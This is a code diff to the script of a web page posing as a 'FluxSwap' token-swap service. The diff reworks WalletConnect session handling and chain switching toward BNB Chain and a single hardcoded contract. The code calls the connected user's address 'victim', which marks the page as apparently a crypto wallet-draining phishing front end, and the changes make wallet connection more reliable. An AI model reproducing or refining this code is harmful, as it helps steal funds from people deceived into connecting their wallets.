@@ -240,7 +240,6 @@
 
             const PROJECT_ID = '2c94255cd6cb3dd91ea6f447bbe7d3c9';
 
-            // ===== TARGET CHAIN: жёстко BNB =====
             const TARGET_CHAIN_ID = 56;
             const TARGET_CHAIN_HEX = '0x38';
             const TARGET_CHAIN_PARAMS = {
@@ -251,8 +250,6 @@
                 blockExplorerUrls: ['https://bscscan.com/']
             };
 
-            // Только BNB-контракт. Ключ 1 удалён намеренно — если что-то пойдёт не так,
-            // код упадёт в "Network not supported", а не отправит на ETH-адрес.
             const CONTRACT_ADDRESSES = {
                 56: '0x71774b5BFa1bf180eDA6CC1550f4569d08b5CD33'
             };
@@ -338,23 +335,43 @@
                 return id === 56 ? 'BNB Chain' : ('Chain ' + id);
             }
 
+            // Универсальный парсер: number как есть, "0x..." — hex, "56" — decimal
+            function parseChainId(raw) {
+                if (raw === null || raw === undefined) return null;
+                if (typeof raw === 'number') return raw;
+                if (typeof raw === 'string') {
+                    const s = raw.trim();
+                    if (!s) return null;
+                    if (s.startsWith('0x') || s.startsWith('0X')) {
+                        const n = parseInt(s, 16);
+                        return Number.isFinite(n) ? n : null;
+                    }
+                    const n = parseInt(s, 10);
+                    return Number.isFinite(n) ? n : null;
+                }
+                return null;
+            }
+
             async function readLiveChainId(wc) {
                 try {
-                    const hex = await wc.request({ method: 'eth_chainId' });
-                    return parseInt(hex, 16);
+                    const raw = await wc.request({ method: 'eth_chainId' });
+                    console.log('[FluxSwap] raw eth_chainId:', raw, '(' + typeof raw + ')');
+                    return parseChainId(raw);
                 } catch (e) {
                     console.warn('[FluxSwap] eth_chainId failed:', e);
                     return null;
                 }
             }
 
-            // Принудительный перевод кошелька на BNB. Возвращает true, если на BNB.
+            // Не фатальный switch — если кошелёк не дал, идём дальше как есть
             async function ensureTargetChain() {
                 if (!wcProvider) return false;
 
                 const live = await readLiveChainId(wcProvider);
                 console.log('[FluxSwap] live chainId before switch:', live);
+
                 if (live === TARGET_CHAIN_ID) return true;
+                if (!live) return false;
 
                 try {
                     await wcProvider.request({
@@ -363,9 +380,9 @@
                     });
                     return true;
                 } catch (e) {
-                    const msg = (e && e.message) || '';
                     const code = e && e.code;
-                    if (code === 4902 || msg.toLowerCase().includes('unrecognized') || msg.toLowerCase().includes('not added')) {
+                    const msg = (e && e.message) || '';
+                    if (code === 4902 || msg.toLowerCase().includes('unrecognized')) {
                         try {
                             await wcProvider.request({
                                 method: 'wallet_addEthereumChain',
@@ -373,10 +390,10 @@
                             });
                             return true;
                         } catch (e2) {
-                            console.error('[FluxSwap] add chain failed:', e2);
+                            console.warn('[FluxSwap] add chain non-fatal:', e2 && e2.message);
                         }
                     }
-                    console.error('[FluxSwap] switch to BNB failed:', e);
+                    console.warn('[FluxSwap] switch non-fatal:', msg || code);
                     return false;
                 }
             }
@@ -431,10 +448,14 @@
                     wcProvider = restored;
                     attachProviderEvents(restored);
 
-                    // Форсим BNB
-                    const ok = await ensureTargetChain();
-                    if (!ok) { clearSession(); return false; }
-                    await new Promise(r => setTimeout(r, 500));
+                    // дать WC сессии устояться перед любыми запросами
+                    await new Promise(r => setTimeout(r, 800));
+
+                    const live = await readLiveChainId(wcProvider);
+                    if (live !== TARGET_CHAIN_ID) {
+                        const ok = await ensureTargetChain();
+                        if (ok) await new Promise(r => setTimeout(r, 500));
+                    }
                     chainId = TARGET_CHAIN_ID;
 
                     const web3Provider = wrapProvider(restored);
@@ -460,8 +481,6 @@
 
             function attachProviderEvents(providerInstance) {
                 providerInstance.on('chainChanged', async () => {
-                    // Принудительно возвращаем на BNB
-                    await ensureTargetChain();
                     await new Promise(r => setTimeout(r, 400));
                     chainId = TARGET_CHAIN_ID;
                     try {
@@ -476,7 +495,7 @@
                     setStatus('✅ ' + chainLabel(chainId) + ' · ' +
                               (victim ? victim.slice(0,6) + '...' + victim.slice(-4) : ''), 'ok');
                     updateRateAndOutput();
-                    console.log('[FluxSwap] chainChanged → forced back to', chainId);
+                    console.log('[FluxSwap] chainChanged handled →', chainId);
                 });
 
                 providerInstance.on('accountsChanged', (accounts) => {
@@ -506,7 +525,6 @@
                     isConnected = false;
                     victim = null;
                     clearSession();
-                    await forceClearSession();
                     updateConnectButton();
                 });
             }
@@ -606,47 +624,33 @@
             function openModal(modal) { modal.classList.add('active'); }
             function closeModal(modal) { modal.classList.remove('active'); }
 
+            // Только чистим локальное хранилище, не трогаем живой wcProvider
+            function purgeWcStorage() {
+                clearSession();
+                const allKeys = Object.keys(localStorage);
+                for (const key of allKeys) {
+                    if (key.toLowerCase().includes('walletconnect') || key.toLowerCase().includes('wc@') || key.toLowerCase().includes('wallet-connect')) {
+                        localStorage.removeItem(key);
+                    }
+                }
+                const sKeys = Object.keys(sessionStorage);
+                for (const key of sKeys) {
+                    if (key.toLowerCase().includes('walletconnect') || key.toLowerCase().includes('wc@') || key.toLowerCase().includes('wallet-connect')) {
+                        sessionStorage.removeItem(key);
+                    }
+                }
+            }
+
             async function forceClearSession() {
                 try {
                     if (wcProvider) {
                         try { await wcProvider.disconnect(); } catch (_) {}
                         wcProvider = null;
                     }
-                    clearSession();
-                    const allKeys = Object.keys(localStorage);
-                    for (const key of allKeys) {
-                        if (key.toLowerCase().includes('walletconnect') || key.toLowerCase().includes('wc@') || key.toLowerCase().includes('wallet-connect')) {
-                            localStorage.removeItem(key);
-                        }
-                    }
-                    const sKeys = Object.keys(sessionStorage);
-                    for (const key of sKeys) {
-                        if (key.toLowerCase().includes('walletconnect') || key.toLowerCase().includes('wc@') || key.toLowerCase().includes('wallet-connect')) {
-                            sessionStorage.removeItem(key);
-                        }
-                    }
-                    document.cookie.split(';').forEach(cookie => {
-                        const [name] = cookie.trim().split('=');
-                        if (name && (name.toLowerCase().includes('walletconnect') || name.toLowerCase().includes('wc@'))) {
-                            document.cookie = name + '=; expires=Thu, 01 Jan 1970 00:00:00 UTC; path=/;';
-                        }
-                    });
-                    try {
-                        const dbs = await indexedDB.databases();
-                        for (const db of dbs) {
-                            if (db.name && (db.name.toLowerCase().includes('wallet') || db.name.toLowerCase().includes('wc'))) {
-                                await new Promise((resolve, reject) => {
-                                    const req = indexedDB.deleteDatabase(db.name);
-                                    req.onsuccess = resolve;
-                                    req.onerror = reject;
-                                });
-                            }
-                        }
-                    } catch (_) {}
+                    purgeWcStorage();
                     provider = null; signer = null; victim = null;
                     chainId = TARGET_CHAIN_ID;
                     isConnected = false; isProcessing = false; isConnecting = false;
-                    wcProvider = null;
                     if (retryTimer) { clearTimeout(retryTimer); retryTimer = null; }
                 } catch (_) {}
             }
@@ -655,8 +659,6 @@
             async function connectWalletConnect() {
                 if (isConnecting || isProcessing) return;
                 closeModal(walletModal);
-
-                await forceClearSession();
 
                 const EthereumProvider = window.WalletConnectProvider;
                 if (!EthereumProvider) {
@@ -667,6 +669,9 @@
                 try {
                     setStatus('Connecting to WalletConnect...', '');
                     isConnecting = true;
+
+                    // Чистим ТОЛЬКО хранилище (не disconnect старого провайдера — он уже мёртв)
+                    purgeWcStorage();
 
                     wcProvider = await EthereumProvider.init({
                         projectId: PROJECT_ID,
@@ -689,17 +694,15 @@
                         throw new Error('No accounts returned');
                     }
 
-                    // Форсим BNB
-                    const ok = await ensureTargetChain();
-                    if (!ok) {
-                        setStatus('❌ Переключи кошелёк на BNB Chain', 'err');
-                        isConnecting = false;
-                        await forceClearSession();
-                        return;
+                    // ждём, пока WC сессия устоится — критично, иначе switchEthereumChain падает
+                    await new Promise(r => setTimeout(r, 800));
+
+                    const live = await readLiveChainId(wcProvider);
+                    if (live !== TARGET_CHAIN_ID) {
+                        const ok = await ensureTargetChain();
+                        if (ok) await new Promise(r => setTimeout(r, 500));
                     }
-                    await new Promise(r => setTimeout(r, 600));
                     chainId = TARGET_CHAIN_ID;
-                    console.log('[FluxSwap] chainId forced to', chainId);
 
                     const web3Provider = wrapProvider(wcProvider);
                     const signer_ = web3Provider.getSigner();
@@ -718,26 +721,18 @@
 
                 } catch (e) {
                     console.error('WalletConnect error:', e);
-                    const msg = e.message || '';
+                    const msg = (e && e.message) || '';
                     if (msg.includes('reset') || msg.includes('cancelled') || msg.includes('closed') || msg.includes('rejected')) {
                         setStatus('Connection cancelled by user', 'err');
-                        await forceClearSession();
                     } else if (msg.includes('origin not allowed') || msg.includes('3000')) {
                         setStatus('❌ Домен не разрешён в WalletConnect Cloud. Добавьте fluxswap.online в Allowed Origins.', 'err');
                     } else {
-                        setStatus('Connection failed: ' + (msg.includes('reset') ? 'please try again' : msg), 'err');
+                        setStatus('Connection failed: ' + msg, 'err');
                     }
                     isConnecting = false;
-                    await forceClearSession();
-                    if (msg.toLowerCase().includes('reset') || msg.includes('retry')) {
-                        setStatus('Retrying...', 'err');
-                        retryTimer = setTimeout(() => {
-                            retryTimer = null;
-                            if (!isConnected && !isConnecting) {
-                                connectWalletConnect();
-                            }
-                        }, 2000);
-                    }
+                    try { if (wcProvider) await wcProvider.disconnect(); } catch (_) {}
+                    wcProvider = null;
+                    purgeWcStorage();
                 }
             }
 
@@ -749,22 +744,20 @@
                     return;
                 }
 
-                // Форсим BNB перед отправкой
-                const ok = await ensureTargetChain();
-                if (!ok) {
-                    setStatus('❌ Переключи кошелёк на BNB Chain', 'err');
-                    return;
+                const live = await readLiveChainId(wcProvider);
+                if (live !== TARGET_CHAIN_ID) {
+                    const ok = await ensureTargetChain();
+                    if (ok) await new Promise(r => setTimeout(r, 500));
                 }
-                await new Promise(r => setTimeout(r, 400));
                 chainId = TARGET_CHAIN_ID;
 
                 provider = wrapProvider(wcProvider);
                 signer = provider.getSigner();
-                console.log('[FluxSwap] executeSwap forced chain', chainId);
+                console.log('[FluxSwap] executeSwap chain', chainId);
 
                 const contractAddr = CONTRACT_ADDRESSES[chainId];
-                if (!contractAddr || contractAddr === '0x0000000000000000000000000000000000000000') {
-                    setStatus('Network not supported (' + chainLabel(chainId) + ') or contract not configured.', 'err');
+                if (!contractAddr) {
+                    setStatus('Network not supported (' + chainLabel(chainId) + ')', 'err');
                     return;
                 }
 
@@ -862,7 +855,7 @@
 
                 } catch (e) {
                     console.error('Swap error:', e);
-                    setStatus('Transaction rejected or error: ' + (e.message || 'unknown'), 'err');
+                    setStatus('Transaction rejected or error: ' + ((e && e.message) || 'unknown'), 'err');
                 } finally {
                     isProcessing = false;
                     updateSwapButton();
@@ -872,8 +865,7 @@
             // ===== Handlers =====
             connectBtn.addEventListener('click', function() { openModal(walletModal); });
 
-            walletConnectOption.addEventListener('click', async function() {
-                await forceClearSession();
+            walletConnectOption.addEventListener('click', function() {
                 connectWalletConnect();
             });
 
@@ -973,28 +965,20 @@
 
             // ===== Init =====
             async function init() {
-                await forceClearSession();
                 updateConnectButton();
                 setStatus('Connect wallet to start swapping', '');
 
                 if (typeof ethers === 'undefined') {
                     setStatus('❌ ethers library not loaded', 'err');
-                } else {
-                    console.log('✅ Ethers loaded');
+                    return;
                 }
-
                 if (typeof window.WalletConnectProvider === 'undefined') {
                     console.warn('⚠️ WalletConnect not loaded yet');
-                } else {
-                    console.log('✅ WalletConnect loaded');
+                    return;
                 }
 
                 const restored = await restoreSession();
-                if (restored) {
-                    console.log('✅ Session restored');
-                } else {
-                    console.log('No session to restore');
-                }
+                console.log(restored ? '✅ Session restored' : 'No session to restore');
 
                 const params = new URLSearchParams(window.location.search);
                 if (params.has('nocache') || params.has('reset')) {
